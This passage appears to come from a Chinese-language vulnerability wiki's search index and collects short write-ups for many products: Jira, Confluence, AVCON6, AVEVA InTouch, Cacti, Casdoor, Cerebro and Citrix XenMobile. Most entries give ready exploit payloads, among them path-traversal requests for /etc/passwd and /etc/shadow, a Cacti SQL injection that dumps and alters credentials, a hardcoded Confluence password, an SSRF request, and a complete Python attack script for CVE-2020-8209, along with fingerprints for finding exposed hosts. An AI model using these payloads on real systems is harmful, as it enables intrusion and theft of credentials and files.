","date":"0001-01-01","objectID":"/atlassian-jira-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2021-26086/:3:0","tags":null,"title":"","uri":"/atlassian-jira-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2021-26086/"},{"categories":null,"content":"漏洞复现 poc： /s/cfx/_/;/WEB-INF/web.xml /s/cfx/_/;/WEB-INF/decorators.xml /s/cfx/_/;/WEB-INF/classes/seraph-config.xml /s/cfx/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties /s/cfx/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.xml /s/cfx/_/;/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml /s/cfx/_/;/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.properties ","date":"0001-01-01","objectID":"/atlassian-jira-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2021-26086/:4:0","tags":null,"title":"","uri":"/atlassian-jira-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2021-26086/"},{"categories":null,"content":"Atlassian Questions For Confluence 身份认证绕过漏洞CVE-2022-26138 ","date":"0001-01-01","objectID":"/atlassian-questions-for-confluence-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-26138/:0:0","tags":null,"title":"","uri":"/atlassian-questions-for-confluence-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-26138/"},{"categories":null,"content":"漏洞描述 Atlassian官方发布了2022年7月的安全更新，其中涉及到Confluence Server的多个漏洞，其中CVE-2022-26138为一个硬编码漏洞。 当Confluence Server或Data Center上的Questions for Confluence app启用时，它会创建一个名为disabledsystemuser的Confluence用户帐户。此帐户旨在帮助将数据从应用程序迁移到 Confluence Cloud的管理员账号中。该帐户通过使用硬编码密码创建并添加到confluence-users组中，在默认情况下允许查看和编辑 Confluence 中的所有非受限页面。 未经身份验证攻击者可以利用所知的硬编码密码登录Confluence并访问该组有权限访问的所有页面。 ","date":"0001-01-01","objectID":"/atlassian-questions-for-confluence-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-26138/:1:0","tags":null,"title":"","uri":"/atlassian-questions-for-confluence-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-26138/"},{"categories":null,"content":"漏洞影响 Questions for Confluence app == 2.7.34 Questions for Confluence app == 2.7.35 Questions for Confluence app == 3.0.2 ","date":"0001-01-01","objectID":"/atlassian-questions-for-confluence-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-26138/:2:0","tags":null,"title":"","uri":"/atlassian-questions-for-confluence-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-26138/"},{"categories":null,"content":"漏洞分析 下载应用程序 confluence-questions-3.0.2.jar 或者另外两个版本。 https://packages.atlassian.com/maven-atlassian-external/com/atlassian/confluence/plugins/confluence-questions/3.0.2/confluence-questions-3.0.2.jar 分析源码，在配置文件default.properties中可以找到所创建用户的相关信息，其中的username和password都是固定的。 使用Java Decompiler打开jar文件，在配置文件default.properties中可以找到所创建用户的相关信息。 上传Questions for Confluence应用程序，使用硬编码用户密码成功登录。 predefined.user.username=disabledsystemuser predefined.user.password=disabled1system1user6708 ","date":"0001-01-01","objectID":"/atlassian-questions-for-confluence-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-26138/:3:0","tags":null,"title":"","uri":"/atlassian-questions-for-confluence-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-26138/"},{"categories":null,"content":"修复建议 目前厂商已发布升级更新Questions for Confluence扩展至以下安全版本: 2.7.x \u003e= 2.7.38 (Confluence 6.13.18 到 7.16.2) Versions \u003e= 3.0.5 (Confluence 7.16.3 之后的版本) https://jira.atlassian.com/browse/CONFSERVER-79483 ","date":"0001-01-01","objectID":"/atlassian-questions-for-confluence-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-26138/:4:0","tags":null,"title":"","uri":"/atlassian-questions-for-confluence-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-26138/"},{"categories":null,"content":"AVCON6 系统管理平台 download.action 任意文件下载漏洞 ","date":"0001-01-01","objectID":"/avcon6-%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-download.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/avcon6-%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-download.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 AVCON6 系统管理平台 download.action 存在任意文件下载漏洞，攻击者通过漏洞可以下载服务器任意文件 ","date":"0001-01-01","objectID":"/avcon6-%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-download.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/avcon6-%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-download.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 AVCON6 系统管理平台 ","date":"0001-01-01","objectID":"/avcon6-%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-download.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/avcon6-%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-download.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"AVCON-6\" ","date":"0001-01-01","objectID":"/avcon6-%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-download.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/avcon6-%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-download.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /download.action?filename=../../../../../../etc/passwd ","date":"0001-01-01","objectID":"/avcon6-%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-download.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/avcon6-%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-download.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"AVCON6 系统管理平台 org_execl_download.action 任意文件下载漏洞 ","date":"0001-01-01","objectID":"/avcon6-%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-org_execl_download.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/avcon6-%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-org_execl_download.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 AVCON6 系统管理平台 org_execl_download.action存在任意文件下载漏洞，攻击者通过漏洞可以下载服务器任意文件 ","date":"0001-01-01","objectID":"/avcon6-%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-org_execl_download.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/avcon6-%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-org_execl_download.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 AVCON6 系统管理平台 ","date":"0001-01-01","objectID":"/avcon6-%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-org_execl_download.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/avcon6-%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-org_execl_download.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"AVCON-6\" ","date":"0001-01-01","objectID":"/avcon6-%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-org_execl_download.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/avcon6-%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-org_execl_download.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /org_execl_download.action?filename=../../../../../../../../../../../../../etc/shadow ","date":"0001-01-01","objectID":"/avcon6-%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-org_execl_download.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/avcon6-%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-org_execl_download.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"AVEVA InTouch安全网关 AccessAnywhere 任意文件读取漏洞 CVE-2022-23854 ","date":"0001-01-01","objectID":"/aveva-intouch%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-accessanywhere-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-23854/:0:0","tags":null,"title":"","uri":"/aveva-intouch%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-accessanywhere-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-23854/"},{"categories":null,"content":"漏洞描述 AVEVA InTouch Access Anywhere Secure Gateway 2020 R2及以前的版本存在路径遍历漏洞，未授权的攻击者可利用该漏洞获取服务器敏感信息。 ","date":"0001-01-01","objectID":"/aveva-intouch%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-accessanywhere-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-23854/:1:0","tags":null,"title":"","uri":"/aveva-intouch%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-accessanywhere-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-23854/"},{"categories":null,"content":"漏洞影响 AVEVA InTouch安全网关 ","date":"0001-01-01","objectID":"/aveva-intouch%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-accessanywhere-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-23854/:2:0","tags":null,"title":"","uri":"/aveva-intouch%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-accessanywhere-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-23854/"},{"categories":null,"content":"网络测绘 body=\"InTouch Access Anywhere\" ","date":"0001-01-01","objectID":"/aveva-intouch%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-accessanywhere-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-23854/:3:0","tags":null,"title":"","uri":"/aveva-intouch%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-accessanywhere-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-23854/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /AccessAnywhere/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini ","date":"0001-01-01","objectID":"/aveva-intouch%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-accessanywhere-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-23854/:4:0","tags":null,"title":"","uri":"/aveva-intouch%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-accessanywhere-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-23854/"},{"categories":null,"content":"Cacti SQL 注入漏洞 CVE-2020-14295 ","date":"0001-01-01","objectID":"/cacti-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-14295/:0:0","tags":null,"title":"","uri":"/cacti-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-14295/"},{"categories":null,"content":"漏洞描述 Cacti 1.2.12 中 color.php 中存在 SQL注入漏洞，允许具有管理员权限的攻击者通过 filter 参数注入 SQL。因为产品接受堆积的查询，所以这可能导致远程命令执行。目前该漏洞 EXP 已公开。 参考链接： https://github.com/Cacti/cacti/issues/3622 ","date":"0001-01-01","objectID":"/cacti-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-14295/:1:0","tags":null,"title":"","uri":"/cacti-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-14295/"},{"categories":null,"content":"漏洞影响 Cacti \u003c 1.2.13 ","date":"0001-01-01","objectID":"/cacti-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-14295/:2:0","tags":null,"title":"","uri":"/cacti-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-14295/"},{"categories":null,"content":"漏洞复现 poc： /cacti/color.php?action=export\u0026header=false\u0026filter=')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+user_auth+set+username='sqli'+where+id=3;--+- ","date":"0001-01-01","objectID":"/cacti-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-14295/:3:0","tags":null,"title":"","uri":"/cacti-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-14295/"},{"categories":null,"content":"Casbin get-users 账号密码泄漏漏洞 ","date":"0001-01-01","objectID":"/casbin-get-users-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/casbin-get-users-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Casbin get-users api接口存在账号密码泄漏漏洞，攻击者通过漏洞可以获取用户敏感信息 ","date":"0001-01-01","objectID":"/casbin-get-users-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/casbin-get-users-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Casbin ","date":"0001-01-01","objectID":"/casbin-get-users-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/casbin-get-users-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"Casdoor\" ","date":"0001-01-01","objectID":"/casbin-get-users-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/casbin-get-users-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /api/get-users?p=123\u0026pageSize=123 ","date":"0001-01-01","objectID":"/casbin-get-users-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/casbin-get-users-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Casbin casdoor static 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/casdoor-static-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/casdoor-static-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Casdoor 是 Casbin 开源社区推出的基于 OAuth 2.0 / OIDC 的中心化的单点登录（SSO）身份验证平台。 Casdoor static 存在任意文件读取漏洞，攻击者通过发送特殊的请求包可以获取服务器中的敏感文件。 ","date":"0001-01-01","objectID":"/casdoor-static-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/casdoor-static-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Casdoor ","date":"0001-01-01","objectID":"/casdoor-static-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/casdoor-static-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"Casdoor\" ","date":"0001-01-01","objectID":"/casdoor-static-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/casdoor-static-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 或者 poc /static/../../../../../../../../../../../etc/passwd ","date":"0001-01-01","objectID":"/casdoor-static-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/casdoor-static-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Cerebro request SSRF漏洞 ","date":"0001-01-01","objectID":"/cerebro-request-ssrf%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/cerebro-request-ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Cerebro是使用Scala、Play Framework、AngularJS和Bootstrap构建的开源的基于Elasticsearch Web可视化管理工具。您可以通过Cerebro对集群进行web可视化管理，如执行rest请求、修改Elasticsearch配置、监控实时的磁盘，集群负载，内存使用率等。其中某功能存在SSRF漏洞，攻击者通过发送特定的请求包可以探测内网信息 ","date":"0001-01-01","objectID":"/cerebro-request-ssrf%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/cerebro-request-ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Cerebro ","date":"0001-01-01","objectID":"/cerebro-request-ssrf%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/cerebro-request-ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"Cerebro\" ","date":"0001-01-01","objectID":"/cerebro-request-ssrf%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/cerebro-request-ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 主页面 发送请求包 POST /rest/request {\"method\":\"GET\",\"data\":\"\",\"path\":\"robots.txt\",\"host\":\"https://www.baidu.com\"} ","date":"0001-01-01","objectID":"/cerebro-request-ssrf%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/cerebro-request-ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Citrix XenMobile 任意文件读取 CVE-2020-8209 ","date":"0001-01-01","objectID":"/citrix-xenmobile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cve-2020-8209/:0:0","tags":null,"title":"","uri":"/citrix-xenmobile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cve-2020-8209/"},{"categories":null,"content":"漏洞描述 XenMobile是Citrix开发的企业移动性管理软件。该产品允许企业管理员工的移动设备和移动应用程序。该软件的目的是通过允许员工安全地在企业拥有的和个人移动设备及应用程序上工作来提高生产率。 CVE-2020-8209，路径遍历漏洞。此漏洞允许未经授权的用户读取任意文件，包括包含密码的配置文件 ","date":"0001-01-01","objectID":"/citrix-xenmobile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cve-2020-8209/:1:0","tags":null,"title":"","uri":"/citrix-xenmobile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cve-2020-8209/"},{"categories":null,"content":"漏洞影响 RP2之前的XenMobile服务器10.12 RP4之前的XenMobile服务器10.11 RP6之前的XenMobile服务器10.1010.9 RP5之前的XenMobile服务器 ","date":"0001-01-01","objectID":"/citrix-xenmobile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cve-2020-8209/:2:0","tags":null,"title":"","uri":"/citrix-xenmobile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cve-2020-8209/"},{"categories":null,"content":"网络测绘 title=\"XenMobile\" ","date":"0001-01-01","objectID":"/citrix-xenmobile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cve-2020-8209/:3:0","tags":null,"title":"","uri":"/citrix-xenmobile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cve-2020-8209/"},{"categories":null,"content":"漏洞复现 访问 http://xxx.xxx.xxx.xxx/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd 可以成功下载**/etc/passwd**文件 ","date":"0001-01-01","objectID":"/citrix-xenmobile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cve-2020-8209/:4:0","tags":null,"title":"","uri":"/citrix-xenmobile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cve-2020-8209/"},{"categories":null,"content":"漏洞POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import hashlib import sys import requests import random import re import urllib3 def title(): print('+------------------------------------------') print('+ \\033[34mVersion: Citrix XenMobile \\033[0m') print('+ \\033[36m使用格式: python3 CVE-2020-8209.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=10) print(\"\\033[32m[o] 含有CVE-2020-8209漏洞，成功读取/etc/passwd\\033[0m\\n{} \".format(response.text)) except: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e \u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/citrix-xenmobile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cve-2020-8209/:5:0","tags":null,"title":"","uri":"/citrix-xenmobile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cve-2020-8209/"},{"categories":null,"content":"CloudPanel makefile 任意文件上传漏洞 CVE-2023-35885 ","date":"0001-01-01","objectID":"/cloudpanel-makefile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2023-35885/:0:0","tags":null,"title":"","uri":"/cloudpanel-makefile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2023-35885/"},{"categories":null,"content":"漏洞描述 CloudPanel是一个免费的基于PHP的高性能服务器控制面板，具有轻量级组件和现代功能，易于使用，且支持多个PHP版本，提供多语言版本切换。 CloudPanel makefile 接口存在任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限。 ","date":"0001-01-01","objectID":"/cloudpanel-makefile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2023-35885/:1:0","tags":null,"title":"","uri":"/cloudpanel-makefile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2023-35885/"},{"categories":null,"content":"漏洞影响 cloudpanel 2.0.0 \u003e= 2.3.0 